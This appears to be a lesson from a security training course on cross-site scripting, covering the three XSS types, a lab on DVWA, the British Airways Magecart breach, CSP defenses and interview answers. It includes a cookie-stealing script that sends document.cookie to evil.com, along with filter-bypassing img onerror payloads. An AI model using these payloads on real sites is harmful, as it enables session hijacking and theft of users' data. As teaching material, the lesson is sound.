DAY 24 OF 90 — PHASE 2: CORE SECURITY CONCEPTS

Cross-Site Scripting XSS

XSS turns a trusted website into a delivery vehicle for malicious scripts. Today you write and test stored, reflected, and DOM-based XSS payloads.

THEORY

What is XSS? Cross-Site Scripting (XSS) is an injection vulnerability where an attacker injects client-side scripts into web pages viewed by other users. Unlike SQL injection which targets the database, XSS targets the browser. The injected script runs in the victim's browser session with the same origin as the trusted website — meaning it can read cookies, make authenticated requests, modify the DOM, and exfiltrate data.

The three types of XSS:

Stored (Persistent)
The payload is saved on the server (in a database, comment field, forum post) and served to every user who views the page. Most dangerous — no delivery required beyond normal browsing.
Reflected (Non-Persistent)
The payload is in the request (URL param, search query) and reflected back in the response immediately. Requires victim to click a crafted link. Used in phishing and social engineering.
DOM-Based
The payload never reaches the server. Client-side JavaScript reads attacker-controlled data (URL fragment, window.name, postMessage) and writes it to the DOM unsafely using innerHTML or document.write.

Classic stored XSS payload:

<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script> ↑ Submitted in a comment box, forum post, or profile field. Every visitor executes this — their cookies sent to attacker.

Reflected XSS — the phishing vector:

# Victim visits: https://victim.com/search?q=<script>alert(document.cookie)</script> # Server reflects the search term in the page without sanitization: <p>Your search for '<script>alert(document.cookie)</script>' returned no results.</p>

Why XSS is so dangerous: Unlike SQL injection where the attacker targets server data, XSS weaponizes the victim's own browser. The script can: steal session cookies (session hijacking), keylog credentials, deface the page, redirect to phishing sites, perform actions on behalf of the victim (CSRF-style), or deliver drive-by downloads.

Key insight about DOM-based XSS: Traditional server-side XSS filters and WAF rules cannot prevent DOM-based XSS because the entire attack happens client-side. The server sends harmless JavaScript that reads from location.hash or window.name — and the attacker controls those sources. This requires client-side sanitization, specifically avoiding innerHTML and document.write in favor of textContent or safe DOM APIs.
// attacker vs defender mindset
⚔ Attacker
  • Test every input field with <script>alert(1)</script> — if the alert fires, the site is vulnerable and you can replace it with a cookie-stealing payload.
  • Craft reflected XSS in URL parameters: ?search=<img src=x onerror=alert(1)> — the <img> tag bypasses filters that block <script> tags.
  • Use JavaScript event handlers onerror, onload, onfocus, onmouseover for context-specific injection when <script> tags are HTML-encoded.
  • For DOM-based XSS: look for innerHTML, document.write, eval(), location.hash, postMessage listeners in client-side JS files.
🛡 Defender
  • Contextual output encoding: HTML-encode for HTML context, JavaScript-encode for JS strings, URL-encode for URL parameters — each context needs specific encoding.
  • Content-Security-Policy (CSP) is the strongest defense — default-src 'self'; script-src 'self' blocks inline scripts and external script loads even if injection occurs.
  • Use textContent instead of innerHTML for DOM manipulation — it automatically escapes HTML entities and prevents DOM-based XSS.
  • Set HttpOnly flag on session cookies — prevents JavaScript from accessing cookie data via document.cookie, neutralizing standard cookie theft payloads.
// real named incident
2018 — BRITISH AIRWAYS MAGEcart — 380,000 PAYMENT CARDS
Magecart injected JavaScript through an XSS vulnerability on BA's payment page
The Magecart group exploited an unsecured staging endpoint on ba.com that proxied requests to the main site. By injecting a 23-line JavaScript skimmer into the request flow, every payment form submission — card number, expiry, CVV, name — was silently copied to an attacker-controlled server before the legitimate payment processed. Users saw the normal checkout flow; only the injected script running in their browser revealed the attack. 380,000 payment card details were stolen over two weeks. British Airways was fined £20M under GDPR. The root cause: an XSS injection point in the staging server's request handling pipeline.
HANDS-ON LAB

Goal: exploit stored, reflected, and DOM-based XSS vulnerabilities in a controlled lab environment and implement CSP headers to block them.

  1. Start DVWA or Juice Shop — docker run -d -p 80:80 vulnerables/web-dvwa. Log in and set security level to Low.
  2. Go to the XSS Stored page. Enter <script>alert(document.cookie)</script> into the guestbook/comment field. Observe the alert fires on every page load.
  3. Switch to XSS Reflected. Submit <img src=x onerror=alert('XSS')> in the name field — this bypasses basic script-tag filters.
  4. Open your browser DevTools. Find a DOM-based XSS sink — search the JS source for innerHTML, document.write, or location.hash. Craft a payload that exploits it.
  5. Add the CSP header Content-Security-Policy: default-src 'self' to the server response. Verify your XSS payloads no longer execute.
  6. Document each injection point, payload, and whether CSP blocked it.
Deliverable: Three XSS payloads (one stored, one reflected, one DOM-based) with screenshots of each executing, plus a CSP header configuration that blocks all three.

INTERVIEW READY
Q: "Explain the three types of XSS and how each works."
A: "Stored XSS: the payload is saved on the server — in a comment, forum post, or profile field — and executed by every user who views that page. Most dangerous because it's self-propagating. Reflected XSS: the payload is in the request (URL param, search query) and immediately reflected in the response. It requires the victim to click a crafted link. DOM-based XSS: the payload never reaches the server. Client-side JavaScript reads attacker-controllable input from the URL fragment, window.name, or postMessage and writes it to the DOM using unsafe APIs."
Q: "How does Content-Security-Policy protect against XSS?"
A: "CSP is a browser security mechanism that uses an HTTP header to define which content sources the browser is allowed to load. Setting script-src 'self' means only scripts from the same origin execute — inline scripts and external scripts from unknown domains are blocked. It's a powerful defense-in-depth because even if an attacker injects a script tag, the browser refuses to execute it. CSP can also report violations via the report-uri directive."
Q: "Why can't input validation alone prevent XSS?"
A: "Input validation blocks known bad patterns but is easily bypassed — attackers use different tag syntax, encoding, event handlers, or polyglots. It's impossible to enumerate all XSS vectors. Proper defense requires output encoding based on context (HTML, JS, URL, CSS), CSP as a safety net, and avoiding dangerous DOM APIs. Defense in depth means no single layer has to be perfect."
